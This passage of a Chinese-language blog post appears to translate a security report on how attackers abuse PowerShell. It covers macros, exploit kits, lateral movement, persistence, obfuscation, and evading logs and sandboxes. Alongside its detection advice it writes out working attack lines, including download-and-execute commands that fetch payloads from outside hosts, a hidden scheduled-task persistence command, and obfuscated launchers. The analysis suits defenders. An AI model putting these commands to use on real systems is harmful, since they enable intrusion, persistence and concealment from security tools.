+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nl">Author:</span> <span class="n">PoWErShELL</span> <span class="o">-</span><span class="n">EXeCUTIo</span> <span class="n">BYpasS</span> <span class="o">-</span><span class="n">wIndOWSTy</span> <span class="n">HiDDEN</span> <span class="o">-</span><span class="n">nolOgO</span> <span class="o">-</span><span class="n">NOe</span> <span class="o">-</span><span class="n">NoNiNTer</span> <span class="o">-</span><span class="n">noPrOFil</span> <span class="o">-</span><span class="n">COmm</span> <span class="err">“</span> <span class="p">.</span> 
+<span class="p">(</span> <span class="err">\”</span><span class="p">{</span><span class="mi">0</span><span class="p">}{</span><span class="mi">1</span><span class="p">}</span><span class="err">\”</span><span class="o">-</span><span class="n">f</span><span class="err">’</span><span class="n">I</span><span class="err">’</span><span class="p">,</span><span class="err">’</span><span class="n">EX</span><span class="err">’</span><span class="p">)</span> <span class="p">(</span> <span class="p">(</span> <span class="o">&amp;</span><span class="p">(</span> <span class="err">\”</span><span class="p">{</span><span class="mi">0</span><span class="p">}{</span><span class="mi">1</span><span class="p">}{</span><span class="mi">2</span><span class="p">}</span><span class="err">\”</span><span class="o">-</span><span class="n">f</span> <span class="err">‘</span><span class="n">new</span><span class="err">’</span><span class="p">,</span><span class="err">’</span><span class="o">-</span><span class="n">o</span><span class="err">’</span><span class="p">,</span><span class="err">’</span><span class="n">bject</span><span class="err">’</span> <span class="p">)</span> <span class="p">(</span> <span class="err">\”</span><span class="p">{</span><span class="mi">0</span><span class="p">}{</span><span class="mi">2</span><span class="p">}{</span><span class="mi">1</span><span class="p">}{</span><span class="mi">3</span><span class="p">}</span><span class="err">\”</span><span class="o">-</span><span class="n">f</span><span class="err">’</span><span class="n">net</span><span class="err">’</span><span class="p">,</span><span class="err">’</span><span class="n">n</span><span class="err">’</span><span class="p">,</span><span class="err">’</span><span class="p">.</span> <span class="n">webclie</span><span class="err">’</span><span class="p">,</span><span class="err">’</span><span class="n">t</span><span class="err">’</span><span class="p">)</span> <span class="p">)</span><span class="err">…</span> 
+</code></pre></div></div>
+
+<p>恶意宏可以使用破折号（-）选项来运行powershell可执行文件，然后将脚本的奇遇部分写到标准输入(stdin)。因此，一些日志工具可能不会注意到完整的脚本。攻击者还可以提供.reg 文件，将 powershell payload 添加到注册表中，以便在特定触发器上执行。比如当计算机重启，要使其正常工作，用户必须忽略在试图打开.reg 文件时出现的警告。攻击者也可以用”regedit.exe /s”从另外一个进程静默导入payload。到目前我们还没有看到这些技术在使用，因为常用的方法任然有效。</p>
+
+<h4 id="exploits">Exploits</h4>
+
+<p>Exploit漏洞利用程序也在试验powershell，最近我们看到了Rig，Neutrino，Magnitude，和Sundown exploit kits 利用 Microsoft Internet Explorer Scripting Engine Remote Memory Corruption 漏洞(CVE-2016-0189).此共计会利用Jscirpt和vbscript引擎中的一个缺陷来执行代码。一些共计活动使用powershell脚本而不是一个VBScript来下载和执行文件。下面是一个例子的脚本:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    Set shell=createobject(“Shell.Application”) 
+ 
+shell.ShellExecute “powershell.exe”, “-nop -w hidden -c if(IntPtr]::Size -eq 4){b=’powershell. exe’}else{$b=$env:windir+’\\\\syswow64\\\\  WindowsPowerShell\\\\v1.0\\\\powershell.exe’}; 
+</code></pre></div></div>
+
+<p>$s=New-Object System.Diagnostics.ProcessStartInfo;$s. 
+FileName=$b;$s.Arguments=’-nop -w hidden -c Import- Module BitsTransfer;Start-BitsTransfer “ &amp;nburl&amp;” c:\”&amp;nbExe&amp;”;Invoke-Item c:\”&amp;nbExe&amp;”;’;$s. 
+UseShellExecute=$false;$p=[System.Diagnostics. 
+Process]::Start($s); “,””,”open”,0</p>
+
+<p>在多数情况下，exploit改变为powershell在目前没有真正的好处。因此在目前他们不太可能采取 powershell。然后如果一个网站有一个命令注入路东，攻击者可以利用该漏洞在服务器上执行 powershell 命令。</p>
+
+<h3 id="lateral-movement横向渗透">LATERAL MOVEMENT（横向渗透）</h3>
+
+<p>有多个方法可以用来在远程计算机上运行 powershell 命令。这些技术准许攻击者从一个受威胁的计算机在整个企业环境中传播。攻击者经常跨网络移动，以找到有价值的系统。比如邮件或者数据库服务器,取决于他们的最终目标。他们可能会在其他系统上使用来自初始受损计算机的凭据，知道他们获得更高特权的账户控制权。Powershell命令在远程计算机上运行，并不总是作为恶意行为。系统管理员也会用它们来管理服务器。
+下面来讨论在野外遇到的最长用的横向移动方法</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Command 
+Enter-PSSession 
+WMI/wmic/Invoke-WMImethod 
+Profile injection 
+Task Sheduler 
+Common tools e.g. PsExec 
+Invoke-Command 
+</code></pre></div></div>
+
+<p>Powershell 脚本可以在 Invoke-Command 命令帮助下在远程计算机上运行，例如:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke</span><span class="o">-</span><span class="n">Command</span> <span class="err">–</span><span class="n">ComputerName</span> <span class="err">$</span><span class="n">RemoteComputer</span> <span class="err">–</span><span class="n">ScriptBlock</span> <span class="p">{</span><span class="n">Start</span><span class="o">-</span><span class="n">Process</span> 
+<span class="err">‘</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">mycalc</span><span class="p">.</span><span class="n">exe</span><span class="err">’</span><span class="p">}</span> <span class="err">–</span><span class="n">credential</span> <span class="p">(</span><span class="n">Get</span><span class="o">-</span><span class="n">Credential</span><span class="p">)</span> 
+</code></pre></div></div>
+
+<p>用户可以同时向多台计算机提供参数并并行在多台计算机上执行命令。新线程在签名的
+WsmProvHost.exe 父进程下运行。一旦子进程结束，WsmProvHost 进程也将结束。</p>
+
+<h4 id="enter-pssession">Enter-PSSession</h4>
+
+<p>另外一个方法是用 PSSession 命令进入远程 powershell 会话交互模式。用户可以通过会话远程执行命令，他们可以用 Enter-PSSession 来进入一个交互 shell 或者 New-PSSession 来创建一个新的背景会话。</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Enter-PSSession –ComputerName 192.168.1.2 –Credential $credentials 
+</code></pre></div></div>
+
+<p>运行一个远程 powershell 会话取决于 Windows Remote Mangement（WinRM）服务。该功能必须时通过 Enable-PSRemoting –Force 或组策略手动开启。可用的命令可以通过受约束的运行空间进行限制。</p>
+
+<h4 id="wmi">WMI</h4>
+
+<p>WMI 可以用来在远程计算机上运行应用。这不仅限于在 powershell 脚本，而且该应用程序存在于大多数windows计算机上，这是很容易利用这个的原因。一种命令请求看起来像下面这样:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">([</span><span class="n">WMICLASS</span><span class="p">]</span><span class="err">\\$</span><span class="n">IP</span><span class="err">\</span><span class="n">ROOT</span><span class="err">\</span><span class="n">CIMV2</span><span class="o">:</span><span class="n">win32_process</span><span class="p">).</span><span class="n">Create</span><span class="p">(</span><span class="err">$</span><span class="n">Command2run</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>同样的方法也适用于 WMI command-line 工具:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">Wmic</span> <span class="o">/</span><span class="n">NODE</span><span class="o">:</span><span class="p">[</span><span class="n">SERVER</span> <span class="n">NAME</span><span class="p">]</span> <span class="n">process</span> <span class="n">call</span> <span class="n">create</span> <span class="err">“</span><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="err">–</span><span class="n">Enc</span> <span class="err">‘</span><span class="p">[</span><span class="n">PAYLOAD</span><span class="p">]</span><span class="err">’”</span> 
+</code></pre></div></div>
+
+<p>此外 powershell 支持 WMI 对象，准许脚本直接用 WMI 的功能不需要调用外部命令行。</p>
+
+<pre><code class="language-C">Get-WmiObject –Namespace “root\cimv2” –Class Win32_Process –Impersonation 3 – Credential MYDOM\administrator –ComputerName $Computer 
+</code></pre>
+<h4 id="profile-injection配置文件注入">Profile injection(配置文件注入)</h4>
+
+<p>如果攻击者有向远程计算机powershell配置文件写入权限，他们可以增加恶意代码到里面，此方法任然需要启动 powershell 来执行恶意脚本。但是在一些环境中，会有执行脚本的常规管理任务。</p>
+
+<h4 id="other-methods">Other methods</h4>
+
+<p>其它的策略包含使用系统或公共工具，比如微软自带的 Task Sheduler 或者 PsExec。为了使用 PsExec或者访问远程计算机时，攻击者通常需要一个有效的凭据。获取这些详细信息的最常见方法是使用 Mimikatz 工具。爆出本地的密码。此工具有许多 powershell 的实现，比如Invoke-Mimikatz。</p>
+
+<h3 id="persistence持久控制">PERSISTENCE（持久控制）</h3>
+
+<p>一些针对性的攻击者获取目标权限后，会试图保持控制权限，创建持久的加载点，当 windows 重启后，依然自动启动后门。在一些复杂的攻击活动中，加载点可能不存在，因为攻击者可能会在短时间只会在内存中执行恶意程序，或者窃取凭据，以便以后重新访问计算机。但总的来说加载点创建一个好的后门启动，方便下次入侵。有很多方法可以在 winows 重启后执行代码。最常见的与 powershell 有关的是:</p>
+
+<ul>
+  <li><strong>Registry:</strong> 攻击者可以存储整个脚本在注册表中。减少落地文件。因为磁盘上没有普通的脚本文件在磁盘上。增加了检测威胁的难度。Registry run 键是最常见的加载点。但是其他的加载点例如服务也能正常工作。通过访问注册表，攻击者还可以修改执行策略。因为它存储在注册表中。</li>
+  <li><strong>Scheduled tasks(计划任务):</strong>一个新任务可以创建一个在指定时间执行powershell 命令的任务。
+例如:</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>schtasks /create /tn name /tr “powershell.exe –WindowStyle hidden –NoLogo –
+    NonInteractive  –ep     bypass  –nop    –c  ‘IEX    ((new-object 
+net.webclient).downloadstring(“[REMOVED]”))’” /sc onstart /ru system 
+</code></pre></div></div>
+
+<blockquote>
+  <p>(译者注: 
+/tn 计划名字 
+/tr 执行的命令 
+/sc 执行的模式，onstart 为启动时执行 
+/ru 使用哪个用户执行，默认为当前用户  )</p>
+</blockquote>
+
+<ul>
+  <li><strong>Startup folder（启动文件夹）:</strong> 一个小的脚本文件可以放在启动文件夹来保持启动。</li>
+  <li><strong>WMI:</strong> WMI 可以用在本地或远程执行脚本，同 powershell 组合使用将会有很多强大的功能，攻击者可以为任何特定事件创建筛选器，并创建使用者方法在这些事件上触发恶意脚本。了解更多关于 WMI 威胁，可以查阅 BlackHat 上 Graeber 的分享。</li>
+  <li><strong>Group policies（GPOs）:</strong>组策略可以用来为 powershell 后门添加一个启动点。它可以隐藏在一个已经存在的组策略里面。</li>
+  <li><strong>Infect local profiles(感染本地配置文件)：</strong> 攻击者可以将恶意代码存放在 6 个可用的 powershell 配置文件里，或者另外创建一个自定义的。当 powershell 启动时，这个代码就会被执行，为了触发受感染的配置文件，一个良性的 powershell 脚本可以放在前面讨论的任何加载点。</li>
+</ul>
+
+<h4 id="poweliks">Poweliks</h4>
+
+<p>注册表键值保持持久性最突出的示例之一是从 2014 年起的 Trojan.Poweliks。使用 powershell 来创建一个无落地文件的持久启动点，在此之后，Trojan.Kotver 开始使用类似的技巧，它是当今最活跃的威胁之一。 
+创建一个使用非 ASCII 字符作为名称的注册表运行键，这可以防止正常工具显示此值，这类威胁还会修改访问权限，增加删除该键的难度。</p>
+
+<p>这个注册表项使用合法的 rundll32.exe 来执行一个嵌入注册表键的小型 Javascript 代码。这个 Javascript 使用一个 WScript 对象来解密 powershell 脚本从其他的键上，并运行它们。</p>
+
+<p>Powershell 加载一个 watchdog DLL 和其它的 payloads，这些技术准许 poweliks 在计算机上保持活跃状态，而不需要在磁盘上写入普通文件，那样会将它暴露与传统安全工具的检测中。</p>
+
+<p><img src="/img/hack/powershell/1510019333269.png" alt="" /></p>
+
+<blockquote>
+  <p>(Default)值加载并解密”a”值 
+“a”值 javascript 释放 powershell 脚本 
+Powershell 解密 Watchdog DLL 
+Watchdog DLL 使用 rundll.exe 加载，注入一个进程并保持注册表感染值存在。</p>
+</blockquote>
+
+<h2 id="obfuscation混淆">OBFUSCATION(混淆)</h2>
+
+<h3 id="混淆方法">混淆方法</h3>
+
+<p>脚本很容易混淆，简单的随机变量名和字符串串联往往足以欺骗基本的基于静态签名匹配的检测软件。使用 powershell 攻击者可以很多丰富的混淆技巧。Daniel  Bohannon 在 Derbycon     2016 对混淆方法进行了精彩的讨论(https://www.youtube.com/watch?v=P1lkflnWb0I),它他写了一个混淆模块Invoke-Obfuscation.这些方法的大多数都是自动化的。下面是一些讨论的混淆方法的列表:</p>
+<ul>
+  <li>混合大小写，因为命令是不区分大小写的。 例子：<code class="highlighter-rouge">(neW-oBjEct system.NeT.WeBclieNt).dOWNloadfile </code></li>
+  <li>“GET-”可以省略，如果没有指定的话，它会自动添加到命令上。例子：<code class="highlighter-rouge">Get-command</code> 同 Command 功能一样。</li>
+  <li>“System.”可以被省略，如果没有指定，他也会自动添加到对象上。例子：<code class="highlighter-rouge">System.Net.Webclient</code> 同于 Net.WebClient 字符串可以串联，里面可以包含变量，准许单双引号。</li>
+  <li>例子：<code class="highlighter-rouge">(New-Object Net.WebClient).DownloadString(“ht”+’tp://’+$url) </code></li>
+  <li>可以在命令的各部分插入空白 。例子：<code class="highlighter-rouge">( New-Object Net.WebClient ).DownloadString( $url ) </code></li>
+  <li>多个命令可以用来做相同的事情 。例子：<code class="highlighter-rouge">DownloadString</code> 可以替换为 OpenRead 或者 <code class="highlighter-rouge">Invoke-WebRequest </code></li>
+  <li>对象可以设置在变量里，可以在后面命令中使用 。例子：<code class="highlighter-rouge">$webcl=New-Object Net.Webclient;$webcl.DownloadString($url)</code></li>
+  <li>成员参数可以使用单双引号 。例子：’DownloadFile’</li>
+  <li>有例外 14 个特殊情况，转义字符 (` )可以在字符前使用，结果没有任何影响 。</li>
+  <li>例子：<code class="highlighter-rouge">(new-object net.webclient).”d`ownl`oa`dstr`in`g”($url) 
+Get-Command</code> 可以用于搜索命令，并返回一个对象，- - 可以用&amp;或.来调用 .例子：&amp;(Get-Command New-Ob*)</li>
+  <li>很多命令可以调用别名来使用 。例子：GCM 可以代替 Get-Command</li>
+  <li>
+    <table>
+      <tbody>
+        <tr>
+          <td>管道符</td>
+          <td>可以用来改变命令行上的顺序</td>
+        </tr>
+      </tbody>
+    </table>
+  </li>
+  <li>.Invoke()可以用来取代 Invoke-Command 。例子：(New-Object Net.WebClient).DownloadString.invoke($url)</li>
+  <li>有些参数可以用他们的数字替换 。例子：”-window 1” 可以代替”-window hidden”</li>
+  <li>Powershell 1.0 的语法也可以使用 。例子：Scriptblock conversion</li>
+  <li>可以用编码字符(hex,ASCI,octal)替换字符串。例子：[char]58 为”:”</li>
+  <li>应用字符串操作，可以进行任意分隔替换，两次翻转字符串 。例子： <code class="highlighter-rouge">(New-Object Net.WebClient).Downloadstring((http://myGoodSite.tld –replace “Good” 
+“attacker”)) </code></li>
+  <li>字符串可以使用运算符”-f”格式化。 例子： <code class="highlighter-rouge">(New-Object   Net.WebClient).Downloadstring((http://{2}{1}    –f      ‘no’,   ’.TLD’  , 
+‘myAttackerSite’)) </code></li>
+  <li>字符串可以用 Base64 UTF8 来压缩或者编码解码。</li>
+  <li>字符串可以进行加密，比如利用 XOR</li>
+</ul>
+
+<p>在 2010 年，一名日本研究员，完全用符号写了一个”Hello world”的脚本，主要是依靠动态 Invoke-Expressions。这演示了混淆处理如何使脚本更晦涩。</p>
+
+<p><img src="/img/hack/powershell/1510020637752.png" alt="" /></p>
+
+<p>这些方法可以通过递归的方式进行组合和应用，使脚本再命令行中被重重混淆。与任何混淆处理方法一样，如果启用了脚本阻止日志记录和模块日志记录，则可以在分析开始之前应用多个需要处理的隐匿级别，然后在命令记录之前一些混淆将被删除。</p>
+
+<p>下面一个混淆的命令是用一个自动攻击工具生成的，它使用了^字符来混淆 cmd.exe 命令行，并且混杂大小写和空格来混淆 powershell 脚本。这个命令的参数名和顺序始终相同，准许将其顺序映射到指定的工具。</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%SYSTEM%\cmd.exe /c poWerSheLL.exe -eXecutio^nPOlIcy ByPasS^ -n^op^rO^fi^l^e -wIN^dOW^s^tyLe^ hI^d^den^ (n^ew^-^OB^Ject^ ^s^Y^S^tem^.ne^t. we^Bcl^i^ent^)^.^do^wnlo^adf^Ile(^’http://[REMOVED]/ user.php?f=1.dat’,’%USERAPPDATA%.eXe’);^S^tart- 
+^PR^O^ce^SS^ %USERAPPDATA%.eXe 
+</code></pre></div></div>
+
+<p>值得指出的是，在 111 个活跃的威胁家族软件中，只有 8%使用任何混淆，例如大小写混写。 
+有个例子，我们在 2014 年遇到的一个后门木马变体，从简单的 powershll base64 编码开始，第一阶段进行脚本压缩，并通过 Invoke-Expression 调用执行它，这反过来生成了一个脚本，使用 CompileAssemblyFromSource 命令来编译并执行动态嵌入代码，变异后的代码将尝试在挂起状态下执行 rundll32.exe。注入恶意程序到最近创建的进程里，并重启 rundll32 线程。在执行最后的 payload 之前，需要解开这三层混淆。</p>
+
+<h3 id="anti-obfuscation反混淆">ANTI-OBFUSCATION(反混淆)</h3>
+
+<p>当恶意 powershel 脚本执行，它们大部分会使用 Executionpolicy 和 NoProfile 参数，这些特征给在你环境中找出恶意脚本提供了一个好的思路。而不是搜索 Executionpolicy 关键字，可以缩短，搜索”bypass”和”unrestricted”在 powershell 命令中，在大多数情况下，如果一个脚本被混淆，它们就很像是恶意脚本，作为系统管理员没有必要去混淆他们自己的日常工作脚本。虽然一个模糊的日志可能会欺骗自动分析工具，但是它们逃不出敏锐的安全分析员。</p>
+
+<p>一些工具可以分词脚本，powershell 本身有一个很好的分词方法来分解命令以便进一步分析， Lee Holmes 讨论了命令的频率、特殊字符以及 powershell 脚本本身的功能如何发现混淆，比如大量的引号或大括号表明，一个命令可能已被混淆。</p>
+
+<p>如果扩展的日志记录开启了，将会有大量字符混淆会被记录之前删除，因此恶意脚本会在检测到之前就已经执行了，建议将前瞻性的方法和日志监视结合起来。</p>
+
+<h3 id="disguising-scripts伪装脚本">DISGUISING SCRIPTS(伪装脚本)</h3>
+
+<p>有多种方法允许 powershell 脚本不直接使用 powershell.exe 来执行，这些技术可以欺骗基于使用 powershell.exe 或黑名单方式的安全工具。这主要的两个方法使用.NET 框架来工作 (使用 nps 和 Powerpick)或使用单独的运行空间(使用 p0wnedshell 和 PSattack).有各种各样的工具，例如 PS2EXE，它创建一个独立的执行文件，在.NETde 对象的帮助下来执行 powershell 脚本。</p>
+
+<p>另一样技术涉及良性工具 MSBuildShell, 使用 .NET 中的 <code class="highlighter-rouge">MSbuild </code>和
+<code class="highlighter-rouge">System.management.Automation </code>函数来创建一个 powershell 实例，MSBuildShell 可以启动一个 powershell 实例用下面的命令:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    msbuild.exe c:\MSBuildShell.csproj 
+</code></pre></div></div>
+
+<p>其它的攻击者，尝试通过添加合法的方法来混淆检测工具，类似 ping 添加进命令行，这些无用的命令还将延迟 payload 的执行，例如下面的命令</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%SYSTEM%\cmd.exe /c ping localhost &amp; powershell. 
+exe -executionpolicy bypass -noprofile -windowstyle hidden (new-object system.net.webclient). downloadfile(‘http://[REMOVED]/wp-admin/ f915df4a50447.exe’,’%USERAPPDATA%cNZ49.exe’); stARt- 
+ProcEss ‘%USERAPPDATA%cNZ49.exe’ 
+</code></pre></div></div>
+
+<p>有些恶意脚本也会使用 echo 和 type 命令，并通过管道符来发送内容，甚至将 payload 复制到记事本或写字板，这个脚本然后使用其他的实例执行这个位置的 payload。这些操作会打断执行链，因为在最后，它不是同一 powershell 实例在运行 payload。攻击者常常使用模块化方法来混淆基于行为检测的措施，恶意操作在多个进程中传播。</p>
+
+<p>也可以在 powershell 中自动化其它应用程序，例如使用 COM 对象或者 SendKeys 来强制其它应用程序执行网络连接，一个实例，powershell 脚本可以创建一个 Internet Explorer COM 对象使它获取一个 URL，然后可以在脚本找那个加载该网页的内容，并且执行该网页的一部分。日志将显示标准浏览器进行互联网连接，这似乎不可疑。</p>
+
+<p>另外通常的方法，攻击者用来避免启动 powershell.exe 是将脚本存储在环境变量中，然后从变量中调用脚本。Trojan.Kotver 广泛使用该方法，命令行仍将显示在 powershell 日志文件中，但是在大多数情况下，执行的实际脚本可能丢失，例如:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Cmd.exe /c “set myName=[COMMAND] &amp;&amp; powershell IEX $env:myName” 
+</code></pre></div></div>
+
+<p>如果攻击者无法控制脚本的执行方式，一旦它启动，然后脚本可以尝试隐藏它自己的可见窗口，这是由安全研究员 Jeff Wouters 在 2015 发现。即使脚本窗口在一瞬间可见，它可能会被忽视，例如:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-Type -Name win -MemberDefinition 
+‘[DllImport(“user32.dll”)] public static extern bool 
+ShowWindow(int handle, int state);’ -Namespace native [native.win]::ShowWindow(([System.Diagnostics. 
+Process]::GetCurrentProcess() | Get-Process). 
+MainWindowHandle,0) 
+</code></pre></div></div>
+
+<p>我们还发现攻击者使用多种文件同时出现，这是有效的多种文件格式，一个文件可以是一个有效的 HTML、WinRAR 和 powershell 脚本一起。根据脚本调用的方式，它会生成不同的结果，这样的行为会迷惑自动的安全系统。这可能有助于逃避检测的威胁。最近看到一个类似的方法，powershell脚本隐藏在证书里(http://pastebin.com/nhtVrdgs)。</p>
+
+<p>正如其它安全研究员所建议的，powershell 中的 Securestring 功能或 Cryptographic MessageSyntax 准许以加密的形式发送命令，这使得命令在传输中很难去分析。密码可以在以后提供解密和运行脚本。</p>
+
+<p>基础的混淆技术不能防止分析威胁，但是它们可以使检测和分析难度加大，然而加密的使用会严重阻碍甚至阻止分析。有个例子被认为突破性的，是 W32.Gauss 恶意软件，如果验证了文件路径，并且目标计算机符合某些其它条件，威胁就会解密 payload，如果一个安全研究员的虚拟机不匹配这个条件，这个恶意软件就不会解密，因此研究员将无法分析恶意软件。 
+Ebowla(https://github.com/Genetic-Malware/Ebowla/blob/master/README.md)工具为各种 payload(包括 powershell 脚本)提供此功能，这脚本只会在特定条件下运行。像预定义的用户名被满足，这使得有针对性的感染，很难用一般的检测方法进行过滤。 
+Hiding from virtual machine environments(从虚拟机环境中隐藏)</p>
+
+<p>Powershell 可以检测如果脚本运行在一个虚拟机环境，它会停止执行，虚拟环境可能是一个沙箱。我们遇到的最常见的沙箱逃逸方法是检查具有建议虚拟环境的名称的进程:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> (get-process|select-string -pattern vboxservice,vboxtray,proxifier,prl_cc,prl_ tools,vmusrvc,vmsrvc,vmtoolsd).count 
+</code></pre></div></div>
+
+<p>脚本还可以检查环境的 BIOS、登录用户、或其他在沙箱中分析的广泛已知的检测方法。</p>
+
+
+        </article>
+        <hr>
+
+        
+        
+            
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                        
+                        <h2 id="similar_posts">Similar Posts</h2>
+                        <ul>
+                        
+                        <li class="relatedPost">
+                            <a href="/2018/01/27/hidden-the-network/">阻碍获取真实网络指纹
+                            
+                            </a>
+                        </li>
+                        
+                        
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                        
+                        <li class="relatedPost">
+                            <a href="/2018/01/04/command-and-control-images/">command-and-control-images
+                            
+                            </a>
+                        </li>
+                        
+                        
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                        
+                        <li class="relatedPost">
+                            <a href="/2017/12/30/exploit-domain/">域渗透的整理
+                            
+                            </a>
+                        </li>
+                        
+                        
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                        
+                        <li class="relatedPost">
+                            <a href="/2017/12/19/build-domain/">域环境
+                            
+                            </a>
+                        </li>
+                        
+                        
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+        
+            </ul>
+        
+
+        <div class="post-recent">
+    <div class="pre">
+        
+        <p><strong>上一篇</strong> <a href="/2017/10/08/powershell/">powershell备忘单</a></p>
+        
+    </div>
+    <div class="nex">
+
+        
+        <p><strong>下一篇</strong> <a href="/2017/10/10/WSL/">WSL</a></p>
+        
+    </div>
+</div>
+
+
+        <h2 id="comments">Comments</h2>
+        
+
+
+<div id="disqus_thread"></div>
+<script>
+    /**
+     * RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+     * LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+     */
+
+    var disqus_config = function() {
+        this.page.url = 'http://localhost:4000/2017/10/08/powershell2/'; // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = 'http://localhost:4000/2017/10/08/powershell2/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+
+    (function() { // DON'T EDIT BELOW THIS LINE
+        var d = document,
+            s = d.createElement('script');
+
+        s.src = '//http-b404-xyz.disqus.com/embed.js';
+
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+
+
+
+    </div>
+    <button class="anchor"><i class="fa fa-anchor"></i></button>
+    <div class="right">
+        <div class="wrap">
+
+            <!-- Content -->
+            <div class="side content">
+                <div>
+                    Content
+                </div>
+                <ul id="content-side" class="content-ul">
+                    
+                    <li><a href="#similar_posts">Similar Posts</a></li>
+                    
+                    <li><a href="#comments">Comments</a></li>
+                </ul>
+            </div>
+            <!-- 其他div框放到这里 -->
+            <!-- <div class="side">bbbb</div> -->
+        </div>
+    </div>
+</div>
+<script>
+/**
+ * target _blank
+ */
+(function() {
+    var aTags = document.querySelectorAll('article a:not([id])')
+    for (var i = 0; i < aTags.length; i++) {
+        aTags[i].setAttribute('target', '_blank')
+    }
+}());
+</script>
+<script src="/js/pageContent.js " charset="utf-8"></script>
+
+
+    <footer class="site-footer">
+
+
+    <div class="wrapper">
+
+        <p class="description">
+             The quieter you become, the more you can hear. 
+        </p>
+
+        <br>
+        <p class="contact">
+             
+            <a href="https://github.com/9jan" title="GitHub"><i class="fa fa-github" aria-hidden="true"></i></a>  
+            <a href="mailto:jirairya404@gmail.com" title="email"><i class="fa fa-envelope-o" aria-hidden="true"></i></a>        
+            
+        </p>
+        <!--
+        <p>
+            本站总访问量<span id="busuanzi_value_site_pv"></span>次，本站访客数<span id="busuanzi_value_site_uv"></span>人次，本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+        </p>
+    -->
+        <p class="power">
+            <span>
+                Site powered by <a href="https://jekyllrb.com/">Jekyll</a>
+            </span>
+        </p>
+    </div>
+</footer>
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+    <div class="back-to-top">
+    <a href="#top" data-scroll>
+        <i class="fa fa-arrow-up" aria-hidden="true"></i>
+    </a>
+</div>
+
+    <script src=" /js/main.js " charset="utf-8"></script>
+    <script src=" /js/smooth-scroll.min.js " charset="utf-8"></script>
+    <script type="text/javascript">
+      smoothScroll.init({
+        speed: 500, // Integer. How fast to complete the scroll in milliseconds
